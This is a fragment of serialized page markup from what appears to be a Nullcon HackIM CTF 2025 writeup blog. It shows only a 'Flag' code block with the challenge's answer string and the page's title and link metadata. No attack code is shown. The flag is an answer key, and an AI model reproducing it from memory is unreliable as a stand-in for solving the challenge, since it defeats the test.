!!!}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1b"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Flag"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ENO{5CR4M83L3D_3GG5_4R3_1ND33D_T45TY!!!}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ENO{5CR4M83L3D_3GG5_4R3_1ND33D_T45TY!!!}"}}]}]]}]]
d:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"Nullcon HackIM CTF 2025 Writeup - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/25a/wp-nullcon-hackim-2025/"}]]
1:null
